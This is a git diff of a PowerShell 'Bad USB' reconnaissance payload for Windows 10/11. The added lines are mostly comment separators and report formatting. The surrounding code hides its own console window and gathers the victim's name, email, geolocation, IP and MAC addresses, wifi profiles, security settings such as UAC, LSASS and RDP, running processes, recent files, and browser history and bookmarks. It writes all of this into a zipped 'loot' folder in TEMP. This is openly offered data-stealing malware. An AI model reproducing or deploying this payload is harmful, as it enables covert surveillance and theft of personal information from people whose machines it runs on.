@@ -8,6 +8,7 @@
 #############################################################################################################################################
 
 
+############################################################################################################################################################
 #############################################################################################################################################
 # Title        : Bad USB          |  
 # Author       : dion@d10xi24     |                             
@@ -15,6 +16,7 @@
 # Category     : Recon            |      
 # Target       : Windows 10,11    |      
 #############################################################################################################################################
+############################################################################################################################################################
 
 
 # Load required assemblies
@@ -23,6 +25,8 @@ Add-Type -Name Win -Member $i -Namespace native
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
 
 
+
+############################################################################################################################################################
 
 # Function to create loot folder, file, and zip
 function Initialize-LootFolder {
@@ -33,6 +37,8 @@ function Initialize-LootFolder {
 
     return $FolderName, $ZIP
 }
+
+############################################################################################################################################################
 
 # Function to get user's full name
 function Get-FullName {
@@ -48,6 +54,8 @@ function Get-FullName {
     return $fullName
 }
 
+############################################################################################################################################################
+
 # Function to get user's email
 function Get-Email {
     try {
@@ -60,6 +68,8 @@ function Get-Email {
         -ErrorAction SilentlyContinue
     }
 }
+
+############################################################################################################################################################
 
 # Function to get geolocation
 function Get-GeoLocation {
@@ -84,6 +94,8 @@ function Get-GeoLocation {
         -ErrorAction SilentlyContinue
     }
 }
+
+############################################################################################################################################################
 
 # Function to get UAC state
 function Get-UACState {
@@ -111,17 +123,23 @@ function Get-UACState {
     }
 }
 
+############################################################################################################################################################
+
 # Function to get LSASS state
 function Get-LSASSState {
     $lsass = Get-Process -Name "lsass"
     return $lsass.ProtectedProcess ? "LSASS is running as a protected process." : "LSASS is not running as a protected process."
 }
 
+############################################################################################################################################################
+
 # Function to get RDP state
 function Get-RDPState {
     $RDPValue = (Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections
     return $RDPValue -eq 0 ? "RDP is Enabled" : "RDP is NOT enabled"
 }
+
+############################################################################################################################################################
 
 # Function to get public and local IPs
 function Get-IPInfo {
@@ -144,6 +162,8 @@ function Get-IPInfo {
     return $computerPubIP, $localIP, $MAC
 }
 
+############################################################################################################################################################
+
 # Function to get computer information
 function Get-ComputerInfo {
     $computerSystem = Get-CimInstance CIM_ComputerSystem
@@ -162,11 +182,15 @@ function Get-ComputerInfo {
     return $computerName, $computerModel, $computerManufacturer, $computerBIOS, $computerOs, $computerCpu, $computerMainboard, $computerRamCapacity, $computerRam, $videocard
 }
 
+############################################################################################################################################################
+
 # Function to get startup contents
 function Get-StartUpContents {
     $StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name
     return $StartUp
 }
+
+############################################################################################################################################################
 
 # Function to get scheduled tasks
 function Get-ScheduledTasks {
@@ -174,17 +198,23 @@ function Get-ScheduledTasks {
     return $ScheduledTasks
 }
 
+############################################################################################################################################################
+
 # Function to get logon sessions
 function Get-LogonSessions {
     $klist = klist sessions
     return $klist
 }
 
+############################################################################################################################################################
+
 # Function to get recent files
 function Get-RecentFiles {
     $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime
     return $RecentFiles
 }
+
+############################################################################################################################################################
 
 # Function to get HDD information
 function Get-HDDInfo {
@@ -199,11 +229,15 @@ function Get-HDDInfo {
     return $Hdds
 }
 
+############################################################################################################################################################
+
 # Function to get COM devices
 function Get-COMDevices {
     $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String -width 250
     return $COMDevices
 }
+
+############################################################################################################################################################
 
 # Function to get network interfaces
 function Get-NetworkInterfaces {
@@ -212,6 +246,8 @@ function Get-NetworkInterfaces {
 
     return $NetworkAdapters, $wifiProfiles
 }
+
+############################################################################################################################################################
 
 # Function to get process information
 function Get-ProcessInfo {
@@ -236,6 +272,8 @@ function Get-ProcessInfo {
 
     return $process, $listener, $service, $software, $drivers, $videocard
 }
+
+############################################################################################################################################################
 
 # Function to get browser data
 function Get-BrowserData {
@@ -277,6 +315,8 @@ function Get-BrowserData {
     return $BrowserData
 }
 
+############################################################################################################################################################
+
 function Get-BrowserHistory {
     param (
         [Parameter(Position=1, Mandatory=$True)]
@@ -313,6 +353,8 @@ function Get-BrowserHistory {
     return $History
 }
 
+############################################################################################################################################################
+
 function Get-BrowserBookmarks {
     param (
         [Parameter(Position=1, Mandatory=$True)]
@@ -332,6 +374,12 @@ function Get-BrowserBookmarks {
     return $BookmarkList
 }
 
+
+############################################################################################################################################################
+
+############################################################################################################################################################
+
+############################################################################################################################################################
 
 # Main execution
 try {
@@ -377,11 +425,17 @@ Username: $UserName
 Full Name: $FullName
 Email: $Email
 GeoLocation: $GeoLocation
+Latitude:  $Lat 
+Longitude: $Lon
+
+------------------------------------------------------------------------------------------------------------------------------
 
 System Information:
 $UACState
 $LSASSState
 $RDPState
+
+------------------------------------------------------------------------------------------------------------------------------
 
 Network Information:
 Public IP: $($IPInfo[0])
@@ -389,10 +443,15 @@ Local IP, MAC Address:
 $($IPInfo[1])
 $($IPInfo[2])
 
+------------------------------------------------------------------------------------------------------------------------------
+
 Computer Information:
 $($ComputerInfo[0])
 $($ComputerInfo[1])
 $($ComputerInfo[2])
+
+------------------------------------------------------------------------------------------------------------------------------
+
 BIOS Information:
 $($ComputerInfo[3])
 Operating System Information:
@@ -407,6 +466,8 @@ Details:
 $($ComputerInfo[8])
 Video Card Information:
 $($ComputerInfo[9])
+
+------------------------------------------------------------------------------------------------------------------------------
 
 Startup Contents:
 $StartUpContents
@@ -426,10 +487,14 @@ $HDDInfo
 COM Devices:
 $COMDevices
 
+------------------------------------------------------------------------------------------------------------------------------
+
 Network Interfaces:
 $NetworkInterfaces
 Wifi Profiles:
 $WifiProfiles
+
+------------------------------------------------------------------------------------------------------------------------------
 
 Processes:
 $ProcessInfo
@@ -443,6 +508,8 @@ Installed Drivers:
 $DriverInfo
 Video Card Information:
 $VideoCardInfo
+
+------------------------------------------------------------------------------------------------------------------------------
 
 Browser Data:
 Google Chrome History:
@@ -464,7 +531,6 @@ Mozilla Firefox Bookmarks:
 $FirefoxBookmarks
 "@
 
-    # Ensure that the output is written to the loot file
     $output > $env:TEMP\$FolderName\computerData.txt
 
     # Zip the loot folder
